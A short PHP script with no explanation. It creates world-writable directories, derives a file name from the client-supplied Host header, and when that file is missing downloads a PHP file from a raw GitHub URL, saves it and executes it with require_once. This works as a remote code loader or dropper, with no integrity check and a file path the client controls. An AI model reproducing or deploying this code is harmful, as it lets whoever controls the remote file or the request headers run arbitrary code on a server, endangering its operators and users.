
<?php

$_dir_ = $_SERVER['DOCUMENT_ROOT'];




if (!file_exists('./script/')) {
    mkdir('./script/', 0777, true);
}
if (!file_exists('./functions/')) {
    mkdir('./functions/', 0777, true);
}
if (!file_exists('./css/')) {
    mkdir('./css/', 0777, true);
}

$tokens = explode(".", $_SERVER['HTTP_HOST']);
$domain = $tokens[0];

if($domain == 'www'){
    $domain = $tokens[1];
}
echo $domain;
$server = $domain;
if ($domain !== ''){
    $domain = './functions/'.$domain.'.php';
} else {
    $domain = './functions/'.$_SERVER['HTTP_HOST'] .'.php';
}

if ( file_exists( $domain) ) {

require_once($domain);
} else {


    $app = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
    $myfile = fopen($domain, "w") or die("Unable to open $domain.'.php'!");
    fwrite($myfile, $app);
    fclose($myfile);
require_once($domain);
    
    }


?>
